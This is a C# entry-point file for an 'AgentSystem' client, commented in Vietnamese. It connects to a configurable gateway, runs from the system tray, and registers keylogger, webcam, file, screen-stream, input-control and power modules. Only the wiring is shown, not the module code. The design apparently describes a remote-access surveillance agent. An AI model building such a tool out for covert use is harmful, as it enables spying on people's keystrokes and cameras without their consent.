 15: 
 16: namespace AgentSystem
 17: {
 18:     internal class Program
 19:     {
 20:         [STAThread]
 21:         static void Main(string[] args)
 22:         {
 23:             // === THÊM ĐOẠN NÀY ĐỂ KHỞI TẠO LOG ===
 24:             Log.Logger = new LoggerConfiguration()
 25:                 .MinimumLevel.Debug() // Ghi lại từ mức Debug trở lên
 26:                 .WriteTo.Console()    // Hiển thị log ra cửa sổ Console
 27:                 .WriteTo.File("Logs/agent-.log", rollingInterval: RollingInterval.Day) // Lưu vào file theo ngày
 28:                 .CreateLogger();
 29: 
 30:             Application.EnableVisualStyles();
 31:             Application.SetCompatibleTextRenderingDefault(false);
 32:             
 33:             // Thay thế Console.WriteLine bằng Log.Information để đồng bộ
 34:             Log.Information("===========================================");
 35:             Log.Information("       AGENT SYSTEM IS STARTING...        ");
 36:             Log.Information("===========================================");
 37: 
 38:             try
 39:             {
 40:                 ConfigManager.Load();
 41: 
 42:                 // Khởi chạy dọn dẹp log định kỳ
 43:                 LogCleanupJob.Start(ConfigManager.Current.LogRetentionDays);
 44: 
 45:                 string agentId = ConfigManager.Current.AgentId;
 46:                 string gatewayUrl = ConfigManager.Current.GatewayUrl;
 47: 
 48:                 bool forceConfig = Array.Exists(args, arg => arg.Equals("--config", StringComparison.OrdinalIgnoreCase));
 49:                 if (string.IsNullOrEmpty(gatewayUrl) || forceConfig)
 50:                 {
 51:                     using (var configForm = new GatewayConfigForm(gatewayUrl))
 52:                     {
 53:                         if (configForm.ShowDialog() == DialogResult.OK)
 54:                         {
 55:                             gatewayUrl = configForm.GatewayUrl;
 56:                             if (ConfigManager.Current.GatewayUrl != gatewayUrl)
 57:                             {
 58:                                 ConfigManager.Current.GatewayUrl = gatewayUrl;
 59:                                 ConfigManager.Save();
 60:                                 Log.Information("[INFO] Đã lưu URL Gateway mới vào cấu hình.");
 61:                             }
 62:                         }
 63:                         else
 64:                         {
 65:                             Log.Information("[INFO] Người dùng đã hủy cấu hình. Đang thoát hệ thống...");
 66:                             return;
 67:                         }
 68:                     }
 69:                 }
 70: 
 71:                 var services = new ServiceCollection();
 72:                 services.AddSingleton<SecurityManager>();
 73:                 services.AddSingleton<UIManager>();
 74:                 services.AddTransient<BaseModule, AppModule>();
 75:                 services.AddTransient<BaseModule, ProcessModule>();
 76:                 services.AddTransient<BaseModule, KeyloggerModule>();
 77:                 services.AddTransient<BaseModule, WebcamModule>();
 78:                 services.AddTransient<BaseModule, FileModule>();
 79:                 services.AddTransient<BaseModule, StreamModule>();
 80:                 services.AddTransient<BaseModule, PowerModule>();
 81:                 services.AddTransient<BaseModule, SysInfoModule>();
 82:                 services.AddTransient<BaseModule, InputModule>();
 83: 
 84:                 services.AddSingleton<AgentClient>(provider => 
 85:                 {
 86:                     var security = provider.GetRequiredService<SecurityManager>();
 87:                     var ui = provider.GetRequiredService<UIManager>();
 88:                     return new AgentClient(agentId, gatewayUrl, security, ui);
 89:                 });
 90:                 services.AddSingleton<IAgentContext>(provider => provider.GetRequiredService<AgentClient>());
 91: 
 92:                 var serviceProvider = services.BuildServiceProvider();
 93:                 AgentClient agent = serviceProvider.GetRequiredService<AgentClient>();
 94:                 var modules = serviceProvider.GetServices<BaseModule>();
 95:                 agent.RegisterModules(modules);
 96: 
 97:                 agent.Start();
 98:                 Log.Information("[INFO] Agent '{agentId}' started.", agentId);
 99:                 Log.Information("[INFO] Connecting to Gateway: {gatewayUrl}", gatewayUrl);
100:                 Log.Information("[INFO] Running in background via System Tray...");
101:                 Application.Run(new TrayApp(agent));
102:             }
103:             catch (Exception ex)
104:             {
105:                 Log.Error(ex, "[ERROR] Fatal System Error: {Message}", ex.Message);
106:             }
107:             finally
108:             {
109:                 Log.Information("[INFO] Agent main loop exited.");
110:                 Log.CloseAndFlush();
111:             }
112:         }
113:     }
114: }
